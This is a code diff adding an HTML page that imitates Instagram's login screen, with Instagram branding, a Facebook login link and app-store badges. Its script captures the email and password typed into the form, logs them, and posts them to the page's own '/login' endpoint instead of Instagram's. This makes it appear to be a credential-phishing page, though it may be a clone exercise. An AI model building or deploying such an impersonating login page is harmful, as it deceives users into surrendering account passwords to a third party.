@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Instagram</title>
+        <link href="https://fonts.googleapis.com/css?family=Cookie|DM+Sans:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" href="/styles/insta.css">
+        <link rel="stylesheet" type="text/css" href="http://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
+        
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <div class="title">
+                    <h1>Instagram</h1>
+                </div>
+                <div class="login">
+                    <form id="loginform">
+                        <input type="email" name="email" placeholder="Phone number, user name, or email">
+                        <input type="password" name="password" placeholder="Password">
+                        <input id="button" type="submit" method="post" value="Log In"> 
+                    </form>
+                    <p>----------- OR -----------</p>
+                    <a href="#" class="fb-login"><i class="ion-social-facebook"></i>Log in with Facebook</a>
+                    <span>Forgot password?</span>
+                </div>
+            </div>
+            <div class="signup">
+                <p>Don't have an account?<a href="#">Sign up</a></p>
+            </div>
+            <div class="download">
+                <p>Get the app.</p>
+                <img src="/images/app-store.svg" class="img-1">
+                <img src="/images/google-play.png" class="img-2">
+            </div>
+        </div>
+        <footer>
+            <ul>
+               <li>ABOUT US</li>
+               <li>SUPPORT</li>
+               <li>PRESS</li>
+               <li>API</li>
+               <li>JOBS</li>
+               <li>PRIVACY</li>
+               <li>TERMS</li>
+               <li>DIRECTORY</li>
+               <li>PROFILES</li>
+               <li>HASHTAGS</li>
+               <li>LANGUAGE</li>
+               <li class="insta">2024 INSTAGRAM</li>
+            </ul>
+        </footer>
+        <script>
+            document.getElementById("loginform").addEventListener("submit", function(event) {
+                event.preventDefault();
+
+                const formData = new FormData(this);
+                const data = Object.fromEntries(formData.entries());
+                console.log(data);
+
+                fetch('/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Success:', data);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            });
+        </script>
+    </body>
+</html>
